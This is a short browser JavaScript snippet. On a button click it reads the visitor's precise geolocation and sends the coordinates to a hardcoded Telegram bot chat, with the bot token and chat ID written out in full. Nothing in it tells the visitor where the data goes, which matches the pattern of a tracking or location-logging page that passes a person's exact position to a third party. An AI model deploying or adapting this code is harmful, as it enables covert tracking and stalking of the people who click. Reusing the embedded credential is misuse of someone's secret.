let btn = document.querySelector('#location');
let token = "8059351572:AAHMF0lgje1u8pGG0QlwoiawcElk96BieyI";
let chatId = 7281878643;
let apiUrl = `https://api.telegram.org/bot${token}/sendLocation`;

function sendMessages() {
    navigator.geolocation.getCurrentPosition(position => {
        let latitude = position.coords.latitude;
        let longitude = position.coords.longitude;

        fetch(apiUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                latitude: latitude,
                longitude: longitude
            })
        })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    console.log("Location sent:", data);
                } else {
                    console.error("Error sending location:", data.description);
                }
            })
            .catch(err => console.error("Ошибка:", err));
    }, error => {
        console.error("Ошибка геолокации:", error.message);
    }, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
    });
}

btn.addEventListener('click', sendMessages);
